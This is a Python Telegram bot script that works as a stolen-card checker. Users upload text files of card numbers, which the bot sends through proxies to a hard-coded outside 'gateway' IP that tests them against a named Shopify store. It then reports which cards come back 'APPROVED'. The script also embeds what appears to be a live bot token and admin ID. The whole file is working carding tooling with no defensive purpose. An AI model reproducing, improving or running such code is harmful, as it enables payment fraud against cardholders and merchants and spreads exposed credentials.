from telebot import TeleBot, types
import requests
import time
import sys
from datetime import datetime

bot = TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU")

GATEWAY = "http://198.105.113.52:8070/check"
SITE = "https://innovativeconcrete.myshopify.com"

ADMIN_ID = 7077294261

proxies_list = []   # Live proxies only

def print_log(text):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {text}", file=sys.stdout, flush=True)

def check_proxy(proxy_str):
    try:
        proxies = {"http": proxy_str, "https": proxy_str}
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8)
        if r.status_code == 200:
            print_log(f"✅ LIVE PROXY: {proxy_str}")
            return True
        else:
            print_log(f"❌ Dead Proxy: {proxy_str}")
            return False
    except:
        print_log(f"❌ Dead Proxy (Timeout): {proxy_str}")
        return False

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Shopify Checker + Proxy Checker ON**\n\n/addpxy se proxy add karo")

@bot.message_handler(commands=['addpxy'])
def add_proxy(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ Admin only")
        return

    if len(m.text.split()) < 2:
        bot.reply_to(m, "Usage: `/addpxy http://ip:port:user:pass`")
        return

    proxy = m.text.split(maxsplit=1)[1].strip()

    bot.reply_to(m, f"🔍 Checking proxy... {proxy}")
    
    if check_proxy(proxy):
        if proxy not in proxies_list:
            proxies_list.append(proxy)
            bot.send_message(m.chat.id, f"✅ **Proxy Added & Live!**\nTotal Live Proxies: {len(proxies_list)}")
        else:
            bot.send_message(m.chat.id, "⚠️ Yeh proxy already added hai")
    else:
        bot.send_message(m.chat.id, "❌ **Proxy Dead hai**, add nahi kiya")

@bot.message_handler(commands=['proxies'])
def show_proxies(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ Admin only")
        return
    if not proxies_list:
        bot.reply_to(m, "Koi live proxy nahi hai")
    else:
        text = f"📌 **Live Proxies ({len(proxies_list)}):**\n\n" + "\n".join(proxies_list)
        bot.reply_to(m, text)

@bot.message_handler(commands=['chk'])
def chk_file(m):
    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")

@bot.message_handler(content_types=['document'])
def handle_file(m):
    if not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "Sirf .txt file bhej")
        return

    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]

    if not cards:
        bot.reply_to(m, "File empty hai")
        return

    bot.send_message(m.chat.id, f"🔄 {len(cards)} cards check shuru...")

    live = 0
    dead = 0
    progress = bot.send_message(m.chat.id, "Processing...")

    for i, card in enumerate(cards):
        try:
            proxy_str = proxies_list[i % len(proxies_list)] if proxies_list else ""
            url = f"{GATEWAY}?card={card}&site={SITE}"
            if proxy_str:
                url += f"&proxy={proxy_str}"

            r = requests.get(url, timeout=25)
            resp = r.text

            if any(x in resp for x in ["Approved", "Success", "charged", "live"]):
                live += 1
                bot.send_message(m.chat.id, f"✅ **APPROVED**\n{card}")
            else:
                dead += 1

            if i % 5 == 0:
                bot.edit_message_text(f"🔄 Checking {i+1}/{len(cards)}\n✅ Live: {live} | ❌ Dead: {dead}", m.chat.id, progress.message_id)

        except:
            dead += 1

    bot.edit_message_text(f"✅ **CHECK COMPLETE**\n✅ Approved: {live}\n❌ Dead: {dead}\nTotal: {len(cards)}", m.chat.id, progress.message_id)

bot.infinity_polling()
